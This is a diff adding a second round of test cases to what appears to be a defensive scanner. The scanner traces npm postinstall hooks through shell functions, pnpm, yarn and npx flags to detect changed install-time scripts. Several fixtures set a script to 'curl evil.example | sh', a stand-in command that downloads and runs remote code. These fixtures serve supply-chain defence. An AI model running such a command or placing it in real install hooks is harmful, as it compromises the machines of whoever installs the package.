@@ -118,3 +118,31 @@ test("a function keyword line keeps its own reading: it still widens when any fi
   expect(h).toContain("a.js");
   expect(h).toContain("assets/x.bmp");
 });
+
+describe("review round two", () => {
+  test("a cd inside a function body does not move the rest of the hook", () => {
+    const hook = "function f { cd sub; }; sh x.sh";
+    const s = (evil: string) =>
+      files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "x.sh": "npm run evil\n", "sub/x.sh": "echo hi\n" });
+    expect(holds(s("echo a"), s("curl evil.example | sh")).length).toBeGreaterThan(0);
+  });
+
+  test("a local script named like a runner receives the words, it does not run them", () => {
+    const hook = "pnpm bun run-s evil";
+    const s = (evil: string) => pkg({ postinstall: hook, bun: "echo harmless", evil });
+    expect(holds(s("echo a"), s("curl evil.example | sh"))).toEqual([]);
+  });
+
+  test("a local file named run-s is not npm-run-all", () => {
+    for (const hook of ["pnpm exec ./tools/run-s evil", "yarn ./tools/run-s evil"]) {
+      const s = (evil: string) =>
+        files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil } }), "tools/run-s": "#!/bin/sh\necho hi\n" });
+      expect(holds(s("echo a"), s("curl evil.example | sh")), hook).toEqual([]);
+    }
+  });
+
+  // On a plain line the hook text itself already names the script (as before); in an if body only the follow reads it.
+  test("npx moved to another package by a workspace or prefix flag does not read this package's script", () => {
+    for (const hook of ["npx --workspace sub run-s evil", "npx --prefix=sub run-s evil", "npx -w sub run-s evil", "npx --prefix sub run-s evil"]) expect(bodyHeld(`if true; then ${hook}; fi`), hook).toBe(false);
+  });
+});
